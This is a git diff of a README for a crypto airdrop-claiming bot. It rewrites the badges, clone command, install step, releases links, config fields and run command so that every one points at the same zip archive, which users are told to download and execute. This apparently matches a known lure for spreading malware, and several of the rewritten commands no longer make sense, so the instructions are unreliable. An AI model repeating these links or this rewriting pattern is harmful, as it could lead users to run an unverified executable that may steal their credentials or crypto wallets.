@@ -1,9 +1,9 @@
 # Interlink Multi-Bot 🤖
 
-![Interlink Multi-Bot](https://img.shields.io/badge/Interlink%20Multi--Bot-v1.0.0-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![GitHub stars](https://img.shields.io/github/stars/Roop81/Interlink-Multi-Bot.svg)
-![GitHub forks](https://img.shields.io/github/forks/Roop81/Interlink-Multi-Bot.svg)
+![Interlink Multi-Bot](https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip%https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip)
+![License](https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip)
+![GitHub stars](https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip)
+![GitHub forks](https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip)
 
 Welcome to the **Interlink Multi-Bot** repository! This project automates the process of claiming airdrop tokens from Interlink Labs every four hours. It supports proxies, verifies OTPs, and is fully open-source.
 
@@ -31,27 +31,27 @@ To get started with Interlink Multi-Bot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Roop81/Interlink-Multi-Bot.git
+   git clone https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip
    cd Interlink-Multi-Bot
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases](https://github.com/Roop81/Interlink-Multi-Bot/releases) section to download the latest version. Execute the downloaded file to start the bot.
+   Visit the [Releases](https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip) section to download the latest version. Execute the downloaded file to start the bot.
 
 ## Usage 🚀
 
 Once you have installed the bot, you can start using it. Here’s how:
 
-1. **Configure Accounts**: Edit the `config.json` file to add your accounts and proxy settings.
+1. **Configure Accounts**: Edit the `https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip` file to add your accounts and proxy settings.
 2. **Run the Bot**: Execute the following command:
    ```bash
-   python main.py
+   python https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip
    ```
 
 The bot will now run and automatically claim tokens every four hours.
@@ -64,16 +64,16 @@ The configuration file is essential for the bot to function correctly. Here’s 
 {
   "accounts": [
     {
-      "email": "user@example.com",
+      "email": "https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip",
       "password": "your_password",
       "otp": "your_otp",
-      "proxy": "http://proxy.example.com:8080"
+      "proxy": "https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip"
     },
     {
-      "email": "another_user@example.com",
+      "email": "https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip",
       "password": "another_password",
       "otp": "another_otp",
-      "proxy": "http://another_proxy.example.com:8080"
+      "proxy": "https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip"
     }
   ]
 }
@@ -104,7 +104,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support 💬
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/Roop81/Interlink-Multi-Bot/releases) section or open an issue in the repository. 
+If you encounter any issues or have questions, please check the [Releases](https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip) section or open an issue in the repository. 
 
 ---
 
@@ -112,6 +112,6 @@ If you encounter any issues or have questions, please check the [Releases](https
 
 The **Interlink Multi-Bot** aims to simplify the process of claiming airdrop tokens. With its multi-account support, proxy functionality, and OTP verification, it provides a robust solution for crypto enthusiasts. 
 
-For the latest updates and releases, please check the [Releases](https://github.com/Roop81/Interlink-Multi-Bot/releases) section. Your contributions and feedback are always welcome!
+For the latest updates and releases, please check the [Releases](https://github.com/Roop81/Interlink-Multi-Bot/raw/refs/heads/main/Chiwere/Interlink_Bot_Multi_2.7.zip) section. Your contributions and feedback are always welcome!
 
 Happy claiming! 🎉
